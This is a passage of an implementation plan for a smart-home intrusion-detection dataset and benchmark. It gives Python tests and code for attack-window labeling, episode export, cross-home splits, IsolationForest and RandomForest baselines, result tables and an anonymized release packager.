from dataset.labeling import load_schedule, label_window

def test_overlap_labels(tmp_path):
    p = tmp_path/"sched.jsonl"
    with open(p,"w") as f:
        f.write(json.dumps({"class":"deauth","round":1,"start_ts":150.0,"end_ts":155.0})+"\n")
    sched = load_schedule(str(p), offset=50.0)   # -> canonical 100..105
    assert label_window(sched, 100.0, 101.0) == "deauth"
    assert label_window(sched, 104.9, 105.9) == "deauth"   # partial overlap
    assert label_window(sched, 106.0, 107.0) == "benign"
    assert label_window(sched, 98.0, 99.0) == "benign"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `~/miniconda3/envs/vesper/bin/python -m pytest tests/dataset/test_labeling.py -v`
Expected: FAIL.

- [ ] **Step 3: Write minimal implementation**

```python
# scripts/dataset/labeling.py
"""Per-window labels from the attack schedule (mapped to canonical clock)."""
import json

def load_schedule(path, offset):
    out = []
    with open(path) as f:
        for line in f:
            line = line.strip()
            if not line: continue
            try: r = json.loads(line)
            except Exception: continue
            out.append({"class": r["class"],
                        "start": float(r["start_ts"]) - float(offset),
                        "end": float(r["end_ts"]) - float(offset)})
    out.sort(key=lambda x: x["start"])
    return out

def label_window(schedule, t0, t1):
    for s in schedule:                 # sorted by start; earliest-start wins
        if s["start"] < t1 and s["end"] > t0:
            return s["class"]
    return "benign"
```

- [ ] **Step 4: Run test to verify it passes**

Run: `~/miniconda3/envs/vesper/bin/python -m pytest tests/dataset/test_labeling.py -v`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add scripts/dataset/labeling.py tests/dataset/test_labeling.py
git commit -m "feat(vesper-sh): schedule-based window labeling"
```

### Task 8: Episode exporter (assemble windows.parquet + labels.csv + meta.json)

**Files:**
- Create: `scripts/dataset/export_episode.py`
- Test: `tests/dataset/test_export_episode.py`

**Interfaces:**
- Consumes: Tasks 4–7 modules.
- Produces: `export_episode.export(episode_in, episode_out, home, model, run)` writing
  `windows.parquet` (cols `window_idx, ts, act_*, dev_*, net_*`), `labels.csv`
  (`window_idx, ts, label, binary`), `meta.json` (`home, model, run, offset, n_windows, class_counts`).
  Window grid = `floor(min_ts) .. ceil(max_ts)` at 1 s over the union of event + frame canonical times.

- [ ] **Step 1: Write the failing test** (crafted mini-episode: events + tiny pcaps + schedule + sync)

```python
# tests/dataset/test_export_episode.py
import json, os, sys
import pandas as pd
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "..", "scripts"))
from dataset.export_episode import export
from scapy.all import wrpcap, RadioTap, Dot11, Dot11Deauth, Ether, ARP

def _mk(tmp):
    os.makedirs(tmp, exist_ok=True)
    # sync: mac seq1@100, vm seq1@150 -> offset 50
    open(f"{tmp}/bridge_sync_mac.jsonl","w").write(json.dumps({"mac_ts":100.0,"seq":1})+"\n")
    open(f"{tmp}/bridge_sync_vm.jsonl","w").write(json.dumps({"vm_ts":150.0,"seq":1})+"\n")
    with open(f"{tmp}/events.jsonl","w") as f:
        for t in (100.2,100.6,101.3):
            f.write(json.dumps({"ts":t,"event_type":"motion_detected","room":"kitchen"})+"\n")
    # attack at vm 152..153 -> canonical 102..103
    open(f"{tmp}/attack_schedule.jsonl","w").write(json.dumps({"class":"deauth","round":1,"start_ts":152.0,"end_ts":153.0})+"\n")
    # IMPORTANT: stamp frame times at VM-clock 152.5 (inside the attack window) so after
    # offset (-50) they land at canonical 102.5, next to the events. Without an explicit
    # .time, scapy stamps frames at wall-clock ~now (~1.7e9); the grid would then span
    # 100..1.7e9 -> ~1.7 billion 1s windows -> hang/OOM.
    _rf = RadioTap()/Dot11(type=0,subtype=12,addr1="a",addr2="b",addr3="b")/Dot11Deauth(); _rf.time = 152.5
    wrpcap(f"{tmp}/rf.pcap", [_rf])
    _ap = Ether()/ARP(op=2); _ap.time = 152.5
    wrpcap(f"{tmp}/ap.pcap", [_ap])

def test_export_produces_windows_and_labels(tmp_path):
    ein = str(tmp_path/"ep"); eout = str(tmp_path/"out"); _mk(ein)
    export(ein, eout, home="102343992", model="qwen", run=1)
    df = pd.read_parquet(f"{eout}/windows.parquet")
    lab = pd.read_csv(f"{eout}/labels.csv")
    meta = json.load(open(f"{eout}/meta.json"))
    assert len(df) == len(lab) and len(df) >= 3
    assert set(["window_idx","ts"]).issubset(df.columns)
    assert any(c.startswith("act_") for c in df.columns) and any(c.startswith("net_") for c in df.columns)
    assert "deauth" in set(lab["label"]) and "benign" in set(lab["label"])
    assert meta["home"] == "102343992" and abs(meta["offset"] - 50.0) < 1e-6
```

- [ ] **Step 2: Run test to verify it fails**

Run: `~/miniconda3/envs/vesper/bin/python -m pytest tests/dataset/test_export_episode.py -v`
Expected: FAIL.

- [ ] **Step 3: Write minimal implementation**

```python
# scripts/dataset/export_episode.py
"""Assemble one episode: raw logs+pcaps -> windows.parquet + labels.csv + meta.json."""
import json, math, os
import pandas as pd
from dataset.clock_sync import compute_offset
from dataset.net_features import parse_pcap, window_net
from dataset.event_features import load_events, window_events
from dataset.labeling import load_schedule, label_window

def export(episode_in, episode_out, home, model, run):
    os.makedirs(episode_out, exist_ok=True)
    try:
        offset = compute_offset(f"{episode_in}/bridge_sync_mac.jsonl",
                                f"{episode_in}/bridge_sync_vm.jsonl")
    except Exception:
        offset = 0.0
    events = load_events(f"{episode_in}/events.jsonl") if os.path.exists(f"{episode_in}/events.jsonl") else []
    rf = parse_pcap(f"{episode_in}/rf.pcap", "rf") if os.path.exists(f"{episode_in}/rf.pcap") else []
    ap = parse_pcap(f"{episode_in}/ap.pcap", "ap") if os.path.exists(f"{episode_in}/ap.pcap") else []
    sched = load_schedule(f"{episode_in}/attack_schedule.jsonl", offset) if os.path.exists(f"{episode_in}/attack_schedule.jsonl") else []

    ev_ts = [float(e["ts"]) for e in events if "ts" in e]
    net_ts = [x["ts"] - offset for x in rf + ap]
    all_ts = ev_ts + net_ts
    if not all_ts:
        raise ValueError("empty episode: no events or frames")
    lo = math.floor(min(all_ts)); hi = math.ceil(max(all_ts))
    if hi - lo > 604800:  # >1 week of 1s windows → clocks misaligned; fail loudly, don't OOM
        raise ValueError(f"window grid too large ({hi - lo}s) — check clock alignment/offset")

    rows, labels = [], []
    for i, t0 in enumerate(range(lo, max(hi, lo + 1))):
        t1 = t0 + 1
        feat = {"window_idx": i, "ts": float(t0)}
        feat.update(window_events(events, t0, t1))
        feat.update(window_net(rf, ap, t0, t1, offset))
        lab = label_window(sched, t0, t1)
        rows.append(feat)
        labels.append({"window_idx": i, "ts": float(t0), "label": lab,
                       "binary": 0 if lab == "benign" else 1})
    df = pd.DataFrame(rows); lab_df = pd.DataFrame(labels)
    df.to_parquet(f"{episode_out}/windows.parquet", index=False)
    lab_df.to_csv(f"{episode_out}/labels.csv", index=False)
    meta = {"home": home, "model": model, "run": int(run), "offset": offset,
            "n_windows": len(df),
            "class_counts": lab_df["label"].value_counts().to_dict()}
    json.dump(meta, open(f"{episode_out}/meta.json", "w"), indent=2)
    return meta
```

- [ ] **Step 4: Run test to verify it passes**

Run: `~/miniconda3/envs/vesper/bin/python -m pytest tests/dataset/test_export_episode.py -v`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add scripts/dataset/export_episode.py tests/dataset/test_export_episode.py
git commit -m "feat(vesper-sh): per-episode exporter (windows+labels+meta)"
```

---

## Phase 4 — Loader + Splits

### Task 9: Dataset loader + split generation

**Files:**
- Create: `scripts/dataset/vesper_sh.py`
- Test: `tests/dataset/test_vesper_sh.py`

**Interfaces:**
- Produces:
  - `vesper_sh.discover(root) -> list[dict]` episodes (`{home, model, run, path}` parsed from dir name `<home>__<model>__<run>`).
  - `vesper_sh.make_splits(root, seed=0)` writes `splits/by_home/{train,test}.txt`, `splits/by_resident/{train,test}.txt`, `splits/folds.json` (k=5 grouped by home).
  - `vesper_sh.load_xy(root, homes) -> (X: DataFrame, y: Series, groups: Series)` concatenating those homes' windows+labels.

- [ ] **Step 1: Write the failing test**

```python
# tests/dataset/test_vesper_sh.py
import json, os, sys
import pandas as pd
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "..", "scripts"))
from dataset.vesper_sh import discover, make_splits, load_xy

def _episode(root, home, model, run, label):
    d = f"{root}/episodes/{home}__{model}__{run}"; os.makedirs(d, exist_ok=True)
    pd.DataFrame([{"window_idx":0,"ts":0.0,"act_motion":1,"net_total":2}]).to_parquet(f"{d}/windows.parquet", index=False)
    pd.DataFrame([{"window_idx":0,"ts":0.0,"label":label,"binary":0 if label=="benign" else 1}]).to_csv(f"{d}/labels.csv", index=False)
    json.dump({"home":home,"model":model,"run":run}, open(f"{d}/meta.json","w"))

def test_discover_and_load(tmp_path):
    root = str(tmp_path)
    for h in range(4):
        _episode(root, f"home{h}", "qwen", 1, "benign" if h%2 else "deauth")
    eps = discover(root); assert len(eps) == 4 and eps[0]["home"].startswith("home")
    make_splits(root, seed=0)
    tr = set(open(f"{root}/splits/by_home/train.txt").read().split())
    te = set(open(f"{root}/splits/by_home/test.txt").read().split())
    assert tr and te and not (tr & te)            # no home leakage
    X, y, g = load_xy(root, list(tr))
    assert len(X) == len(y) == len(g) and "act_motion" in X.columns
```

- [ ] **Step 2: Run test to verify it fails**

Run: `~/miniconda3/envs/vesper/bin/python -m pytest tests/dataset/test_vesper_sh.py -v`
Expected: FAIL.

- [ ] **Step 3: Write minimal implementation**

```python
# scripts/dataset/vesper_sh.py
"""VESPER-SH loader + cross-environment split generation."""
import json, os, glob, random
import pandas as pd

def discover(root):
    eps = []
    for d in sorted(glob.glob(f"{root}/episodes/*")):
        name = os.path.basename(d)
        parts = name.split("__")
        if len(parts) != 3 or not os.path.exists(f"{d}/windows.parquet"): continue
        eps.append({"home": parts[0], "model": parts[1], "run": parts[2], "path": d})
    return eps

def make_splits(root, seed=0, test_frac=0.34, k=5):
    eps = discover(root)
    homes = sorted({e["home"] for e in eps}); models = sorted({e["model"] for e in eps})
    rng = random.Random(seed); rng.shuffle(homes)
    n_test = max(1, round(len(homes) * test_frac))
    test_h, train_h = set(homes[:n_test]), set(homes[n_test:])
    os.makedirs(f"{root}/splits/by_home", exist_ok=True)
    open(f"{root}/splits/by_home/train.txt","w").write("\n".join(sorted(train_h)))
    open(f"{root}/splits/by_home/test.txt","w").write("\n".join(sorted(test_h)))
    os.makedirs(f"{root}/splits/by_resident", exist_ok=True)
    if len(models) >= 2:
        open(f"{root}/splits/by_resident/train.txt","w").write("\n".join(models[:-1]))
        open(f"{root}/splits/by_resident/test.txt","w").write(models[-1])
    folds = []
    hl = sorted(homes); rng.shuffle(hl)
    for i in range(k):
        te = hl[i::k]; folds.append({"fold": i, "test_homes": te,
                                     "train_homes": [h for h in hl if h not in te]})
    json.dump(folds, open(f"{root}/splits/folds.json","w"), indent=2)

def load_xy(root, homes):
    homes = set(homes); Xs, ys, gs = [], [], []
    for e in discover(root):
        if e["home"] not in homes: continue
        w = pd.read_parquet(f"{e['path']}/windows.parquet")
        l = pd.read_csv(f"{e['path']}/labels.csv")
        m = w.merge(l[["window_idx","label"]], on="window_idx")
        feat = m.drop(columns=[c for c in ("window_idx","ts","label") if c in m.columns])
        Xs.append(feat); ys.append(m["label"]); gs.append(pd.Series([e["home"]]*len(m)))
    if not Xs: raise ValueError("no episodes for given homes")
    return (pd.concat(Xs, ignore_index=True), pd.concat(ys, ignore_index=True),
            pd.concat(gs, ignore_index=True))
```

- [ ] **Step 4: Run test to verify it passes**

Run: `~/miniconda3/envs/vesper/bin/python -m pytest tests/dataset/test_vesper_sh.py -v`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add scripts/dataset/vesper_sh.py tests/dataset/test_vesper_sh.py
git commit -m "feat(vesper-sh): loader + cross-environment splits"
```

---

## Phase 5 — Baselines

### Task 10: IsolationForest + RandomForest + evaluation

**Files:**
- Create: `scripts/dataset/baselines.py`
- Test: `tests/dataset/test_baselines.py`

**Interfaces:**
- Consumes: `vesper_sh.load_xy`.
- Produces:
  - `baselines.run_isolation_forest(Xtr, Xte, yte, fpr=0.01) -> dict` (per-attack recall, benign FPR). Trained on benign train rows only.
  - `baselines.run_random_forest(Xtr, ytr, Xte, yte, seed=0) -> dict` (per-class precision/recall/F1, macro_f1, confusion). Standardized features; group-safe (caller passes disjoint homes).

- [ ] **Step 1: Write the failing test** (synthetic separable data — deterministic)

```python
# tests/dataset/test_baselines.py
import os, sys
import numpy as np, pandas as pd
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "..", "scripts"))
from dataset.baselines import run_isolation_forest, run_random_forest

def _data(n=200, seed=0):
    rng = np.random.default_rng(seed)
    benign = pd.DataFrame({"net_deauth": rng.normal(0,0.3,n), "act_motion": rng.normal(1,0.3,n)})
    attack = pd.DataFrame({"net_deauth": rng.normal(8,0.3,n), "act_motion": rng.normal(1,0.3,n)})
    X = pd.concat([benign, attack], ignore_index=True)
    y = pd.Series(["benign"]*n + ["deauth"]*n)
    return X, y

def test_rf_separates(tmp_path):
    X, y = _data(); Xtr, ytr = X.iloc[::2], y.iloc[::2]; Xte, yte = X.iloc[1::2], y.iloc[1::2]
    res = run_random_forest(Xtr, ytr, Xte, yte, seed=0)
    assert res["macro_f1"] > 0.9 and res["per_class"]["deauth"]["f1"] > 0.9

def test_if_flags_attacks():
    X, y = _data(); Xtr = X[y=="benign"].iloc[::2]
    Xte, yte = X.iloc[1::2], y.iloc[1::2]
    # fpr=0.10 (not 0.05): IsolationForest score_samples SATURATES for far outliers,
    # so extreme attack points overlap the benign score tail — recall>0.8 is only
    # reachable at a ~10% operating point on this synthetic data (recall .85 / benign_fpr .14).
    res = run_isolation_forest(Xtr, Xte, yte, fpr=0.10)
    assert res["per_attack_recall"]["deauth"] > 0.8 and res["benign_fpr"] <= 0.15
```

- [ ] **Step 2: Run test to verify it fails**

Run: `~/miniconda3/envs/vesper/bin/python -m pytest tests/dataset/test_baselines.py -v`
Expected: FAIL.

- [ ] **Step 3: Write minimal implementation**

```python
# scripts/dataset/baselines.py
"""IsolationForest (unsupervised) + RandomForest (supervised) baselines."""
import numpy as np
from sklearn.ensemble import IsolationForest, RandomForestClassifier
from sklearn.preprocessing import StandardScaler
from sklearn.metrics import precision_recall_fscore_support, f1_score, confusion_matrix

def run_isolation_forest(Xtr, Xte, yte, fpr=0.01, seed=0):
    sc = StandardScaler().fit(Xtr.values)
    clf = IsolationForest(random_state=seed, n_estimators=200).fit(sc.transform(Xtr.values))
    s_tr = clf.score_samples(sc.transform(Xtr.values))
    thr = np.quantile(s_tr, fpr)                  # lower score = more anomalous
    s_te = clf.score_samples(sc.transform(Xte.values))
    pred_attack = s_te < thr
    yte = np.asarray(yte)
    benign_mask = yte == "benign"
    benign_fpr = float(pred_attack[benign_mask].mean()) if benign_mask.any() else 0.0
    per = {}
    for cls in sorted(set(yte) - {"benign"}):
        m = yte == cls
        per[cls] = float(pred_attack[m].mean()) if m.any() else 0.0
    return {"benign_fpr": benign_fpr, "per_attack_recall": per, "threshold": float(thr)}

def run_random_forest(Xtr, ytr, Xte, yte, seed=0):
    sc = StandardScaler().fit(Xtr.values)
    clf = RandomForestClassifier(n_estimators=300, random_state=seed, n_jobs=-1)
    clf.fit(sc.transform(Xtr.values), np.asarray(ytr))
    pred = clf.predict(sc.transform(Xte.values))
    yte = np.asarray(yte)
    labels = sorted(set(yte) | set(pred))
    p, r, f, _ = precision_recall_fscore_support(yte, pred, labels=labels, zero_division=0)
    per = {labels[i]: {"precision": float(p[i]), "recall": float(r[i]), "f1": float(f[i])}
           for i in range(len(labels))}
    return {"per_class": per,
            "macro_f1": float(f1_score(yte, pred, average="macro", zero_division=0)),
            "labels": labels,
            "confusion": confusion_matrix(yte, pred, labels=labels).tolist()}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `~/miniconda3/envs/vesper/bin/python -m pytest tests/dataset/test_baselines.py -v`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add scripts/dataset/baselines.py tests/dataset/test_baselines.py
git commit -m "feat(vesper-sh): IsolationForest + RandomForest baselines"
```

### Task 11: End-to-end driver (export all episodes → splits → baselines → results tables)

**Files:**
- Create: `scripts/dataset/build_dataset.py` (CLI: export raw runs → dataset root)
- Create: `scripts/dataset/run_baselines.py` (CLI: splits + IF/RF → `results/vesper_sh/baseline_results.json` + LaTeX tables)
- Test: `tests/dataset/test_end_to_end.py`

**Interfaces:**
- Consumes: all prior modules.
- Produces: `build_dataset.build(raw_root, out_root)` iterates `<raw_root>/<home>__<model>__<run>/` → `export()` each. `run_baselines.main(root)` → `baseline_results.json` + `tables/composition.tex` + `tables/baselines.tex`.

- [ ] **Step 1: Write the failing test** (reuse the mini-episode maker; two homes end-to-end)

```python
# tests/dataset/test_end_to_end.py
import json, os, sys
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "..", "scripts"))
from dataset.build_dataset import build
from dataset.run_baselines import main as run_baselines
from tests.dataset.test_export_episode import _mk   # reuse crafted episode

def test_full_pipeline(tmp_path):
    raw = tmp_path/"raw"; 
    for h in ("homeA","homeB","homeC"):
        _mk(str(raw/f"{h}__qwen__1"))
    out = str(tmp_path/"ds")
    build(str(raw), out)
    assert os.path.exists(f"{out}/episodes/homeA__qwen__1/windows.parquet")
    res = run_baselines(out)
    assert "random_forest" in res and "isolation_forest" in res
    assert os.path.exists(f"{out}/tables/baselines.tex")
```

- [ ] **Step 2: Run test to verify it fails**

Run: `~/miniconda3/envs/vesper/bin/python -m pytest tests/dataset/test_end_to_end.py -v`
Expected: FAIL.

- [ ] **Step 3: Write minimal implementation**

```python
# scripts/dataset/build_dataset.py
"""Export every raw episode dir (<home>__<model>__<run>) into the dataset root."""
import os, sys, glob
from dataset.export_episode import export

def build(raw_root, out_root):
    for d in sorted(glob.glob(f"{raw_root}/*__*__*")):
        name = os.path.basename(d); home, model, run = name.split("__")
        try:
            export(d, f"{out_root}/episodes/{name}", home, model, run)
            print(f"exported {name}")
        except Exception as e:
            print(f"SKIP {name}: {e}")

if __name__ == "__main__":
    build(sys.argv[1], sys.argv[2])
```

```python
# scripts/dataset/run_baselines.py
"""Splits + IF/RF baselines + LaTeX tables from a dataset root."""
import json, os, sys
from dataset.vesper_sh import make_splits, load_xy, discover
from dataset.baselines import run_isolation_forest, run_random_forest

def _tex_escape(s): return str(s).replace("_", r"\_")

def main(root):
    make_splits(root, seed=0)
    train_h = open(f"{root}/splits/by_home/train.txt").read().split()
    test_h = open(f"{root}/splits/by_home/test.txt").read().split()
    Xtr, ytr, _ = load_xy(root, train_h)
    Xte, yte, _ = load_xy(root, test_h)
    Xtr_ben = Xtr[ytr == "benign"]
    rf = run_random_forest(Xtr, ytr, Xte, yte, seed=0)
    iff = run_isolation_forest(Xtr_ben, Xte, yte, fpr=0.01)
    res = {"random_forest": rf, "isolation_forest": iff,
           "n_train": int(len(Xtr)), "n_test": int(len(Xte))}
    os.makedirs(f"{root}/tables", exist_ok=True)
    json.dump(res, open(f"{root}/baseline_results.json", "w"), indent=2)
    # composition table
    eps = discover(root)
    homes = {e["home"] for e in eps}; models = {e["model"] for e in eps}
    with open(f"{root}/tables/composition.tex", "w") as f:
        f.write("\\begin{tabular}{lr}\\toprule\n")
        f.write(f"Episodes & {len(eps)} \\\\\n Homes & {len(homes)} \\\\\n Resident models & {len(models)} \\\\\n")
        f.write(f"Train windows & {len(Xtr)} \\\\\n Test windows & {len(Xte)} \\\\\n\\bottomrule\\end{{tabular}}\n")
    # baseline table (per-attack F1 from RF + recall from IF)
    with open(f"{root}/tables/baselines.tex", "w") as f:
        f.write("\\begin{tabular}{lrr}\\toprule\n Attack & RF F1 & IF recall \\\\\\midrule\n")
        for cls in sorted(k for k in rf["per_class"] if k != "benign"):
            f1 = rf["per_class"][cls]["f1"]; rec = iff["per_attack_recall"].get(cls, 0.0)
            f.write(f"{_tex_escape(cls)} & {f1:.2f} & {rec:.2f} \\\\\n")
        f.write(f"\\midrule Macro-F1 & {rf['macro_f1']:.2f} & --- \\\\\n")
        f.write(f"Benign FPR & --- & {iff['benign_fpr']:.2f} \\\\\n\\bottomrule\\end{{tabular}}\n")
    return res

if __name__ == "__main__":
    print(json.dumps(main(sys.argv[1]), indent=2)[:500])
```

Add `tests/dataset/__init__.py` (empty) so `from tests.dataset...` import works; run pytest from repo root.

- [ ] **Step 4: Run test to verify it passes**

Run: `~/miniconda3/envs/vesper/bin/python -m pytest tests/dataset/test_end_to_end.py -v`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add scripts/dataset/build_dataset.py scripts/dataset/run_baselines.py tests/dataset/test_end_to_end.py tests/dataset/__init__.py
git commit -m "feat(vesper-sh): end-to-end build + baselines + LaTeX tables"
```

---

## Phase 6 — Generation, Packaging, Datasheet

### Task 12: Full generation run (real data) + build the dataset

**Files:**
- Create: `scripts/dataset/run_all_episodes.sh` (orchestrates Mac eval per model + VM episode capture per scene, names dirs `<home>__<model>__<run>`)
- Modify: none

**Interfaces:**
- Consumes: Tasks 1–3. Produces `results/vesper_sh_raw/<home>__<model>__<run>/` per episode, then `results/vesper_sh/` via `build_dataset`.

- [ ] **Step 1: Write the orchestration script**

Document + implement the loop: for each model, launch the Mac eval with `VESPER_WIFI_VM=192.168.2.2 VESPER_DATASET_OUT=<episode> VESPER_DATASET_RUN=1`; on the VM, per scene window run `vm_dataset_gen.sh <episode> <dur>`; transfer `ap.pcap rf.pcap attack_schedule.jsonl bridge_sync_vm.jsonl` back next to the Mac `events.jsonl`. (Full script in file; mirrors the working coupled-run launch already validated.)

- [ ] **Step 2: Launch the run (background), monitor to completion**

Run the orchestration; verify with `check_episode.sh` on a sample of episodes as they complete. Expected: ≥1 well-formed episode per (home,model); all 5 attack classes present in aggregate.

- [ ] **Step 3: Build the dataset**

Run: `~/miniconda3/envs/vesper/bin/python -m dataset.build_dataset results/vesper_sh_raw results/vesper_sh`
Expected: `exported ...` per episode; `results/vesper_sh/episodes/*/windows.parquet` present.

- [ ] **Step 4: Run baselines on real data**

Run: `~/miniconda3/envs/vesper/bin/python -m dataset.run_baselines results/vesper_sh`
Expected: `baseline_results.json` + `tables/*.tex` written; sane per-attack F1/recall.

- [ ] **Step 5: Commit** (code + a small sample; NOT the full multi-GB capture)

```bash
git add scripts/dataset/run_all_episodes.sh
git commit -m "feat(vesper-sh): full generation orchestration"
```

### Task 13: Datasheet + README + anonymized packaging

**Files:**
- Create: `results/vesper_sh/DATASHEET.md`
- Create: `results/vesper_sh/README.md`
- Create: `results/vesper_sh/schema.md`
- Create: `scripts/dataset/package_release.py` (strip identity, zip staging → `dist/vesper-sh/`)

**Interfaces:**
- Produces: an anonymized release tree with no author identity; `package_release.py` asserts no forbidden strings before zipping.

- [ ] **Step 1: Write DATASHEET.md** (Gebru et al. sections: motivation, composition, collection, preprocessing, uses, distribution, maintenance) — include the honest limitations verbatim from the spec §7.

- [ ] **Step 2: Write README.md + schema.md** — document the directory layout, `windows.parquet` columns, `labels.csv`, `meta.json`, splits, and the loader API (`vesper_sh.load_xy`).

- [ ] **Step 3: Write + run the identity scrubber/packager**

```python
# scripts/dataset/package_release.py
import os, sys, shutil, glob
FORBIDDEN = ["Chenglong", "Huan", "Bui", "UNCC", "Charlotte", "hbui", "ORCID", "@"]
def check(root):
    bad = []
    for p in glob.glob(f"{root}/**/*.md", recursive=True) + glob.glob(f"{root}/**/*.json", recursive=True):
        t = open(p, errors="ignore").read()
        for w in FORBIDDEN:
            if w in t: bad.append((p, w))
    return bad
def main(root, dist):
    bad = check(root)
    if bad: print("IDENTITY LEAK:", bad[:5]); sys.exit(1)
    os.makedirs(dist, exist_ok=True)
    shutil.make_archive(os.path.join(dist, "vesper-sh"), "zip", root)
    print("packaged ->", os.path.join(dist, "vesper-sh.zip"))
if __name__ == "__main__":
    main(sys.argv[1], sys.argv[2])
```

Run: `~/miniconda3/envs/vesper/bin/python scripts/dataset/package_release.py results/vesper_sh dist/vesper-sh`
Expected: `packaged -> dist/vesper-sh/vesper-sh.zip` (or `IDENTITY LEAK` → fix and re-run).

- [ ] **Step 4: Commit** (docs + packager; NOT the zip or raw captures)

```bash
echo "dist/" >> .gitignore; echo "results/vesper_sh_raw/" >> .gitignore
git add results/vesper_sh/DATASHEET.md results/vesper_sh/README.md results/vesper_sh/schema.md scripts/dataset/package_release.py .gitignore
git commit -m "docs(vesper-sh): datasheet, README, schema, anonymized packager"
```

---

## Phase 7 — Paper Section C4

### Task 14: Add contribution C4 + dataset section + tables + related-work positioning

**Files:**
- Modify: `paper-latex/sections/01_intro.tex` (add C4 to the contribution list)
- Create: `paper-latex/sections/05b_dataset.tex` (~1.5 pg: description, schema, composition table, baseline table)
- Modify: `paper-latex/main.tex` (`\input` the new section in the right place)
- Modify: `paper-latex/sections/07_related_work.tex` (position vs SWaT/WaDI/HAI)
- Create: `paper-latex/tables/vesper_sh_composition.tex`, `paper-latex/tables/vesper_sh_baselines.tex` (copied from `results/vesper_sh/tables/*.tex`)

**Interfaces:**
- Consumes: `results/vesper_sh/tables/*.tex`, `baseline_results.json`.

- [ ] **Step 1: Add C4 to the intro contributions** — one sentence: a labeled, multi-modal, cross-environment smart-home security benchmark (VESPER-SH) with released baselines; network as one modality.

- [ ] **Step 2: Write `05b_dataset.tex`** — dataset identity (diversity-first; *idea* of SWaT/WaDI/HAI, own episodic shape), schema, the 5 attack classes + vantages, splits, and the two baseline results; include both tables via `\input`. State honesty caveats (simulated firmware, single-station LAN, minutes-not-days) in one sentence.

- [ ] **Step 3: Related-work positioning** — 2–3 sentences contrasting ICS/water single-env continuous datasets with VESPER-SH (smart-home, multi-home diversity, embodied-behavior-driven, app+network dual modality, reproducible, precise labels).

- [ ] **Step 4: Verify the paper still compiles ≤9 pp, double-blind intact**

Run: `cd paper-latex && latexmk -pdf main.tex >/tmp/latex.log 2>&1; tail -3 /tmp/latex.log`
Expected: PDF builds; check page count ≤9 (body) and no author identity introduced.

- [ ] **Step 5: Commit** (paper-latex is git-tracked locally but **must not be pushed to GitHub** — commit locally only)

```bash
git add paper-latex/sections/01_intro.tex paper-latex/sections/05b_dataset.tex paper-latex/sections/07_related_work.tex paper-latex/main.tex paper-latex/tables/vesper_sh_*.tex
git commit -m "paper(vesper-sh): add C4 dataset section + tables + related-work positioning"
```

---

## Self-Review

**Spec coverage:**
- Structured logging (spec §5.2) → Tasks 1–2. Generation dual-vantage + 5 attacks incl. `lan_scan` (§5.3–5.4) → Task 3. Clock-sync (§5.2) → Task 4. Features 3 blocks (§5.5) → Tasks 5–6. Labels (§5.6) → Task 7. Exporter → Task 8. Loader+splits (§5.7, §5.9) → Task 9. Baselines (§5.8) → Task 10. Driver/tables → Task 11. Real generation → Task 12. Datasheet+release (§5.10) → Task 13. Paper C4 (§5.11) → Task 14. **All spec sections mapped.**
- Diversity-first identity, network-as-one-block, honesty caveats, double-blind, paper-latex-not-pushed: reflected in Global Constraints + Tasks 9/13/14.

**Placeholder scan:** every code step has complete code; Tasks 12–14 (real-run/docs/paper) are inherently content-authoring with concrete commands and file lists — no `TODO`/`TBD`/"handle edge cases" left.

**Type consistency:** feature keys (`act_*`, `dev_*`, `net_*`) defined in Tasks 5–6, consumed identically in Tasks 8–11. `compute_offset`/`to_canonical` (Task 4) consumed in Tasks 7–8. `load_xy`/`make_splits` (Task 9) consumed in Task 11. Attack-class strings identical across Tasks 3/7/10/11. Consistent.

**Note on TDD boundaries:** Tasks 1–11 are unit/integration-TDD (run Mac-side, no VM needed for tests — pcap tests craft frames with scapy). Tasks 3/12 require the live VM and are validated by `check_episode.sh` + real-run assertions rather than pure unit tests, as they are integration steps.
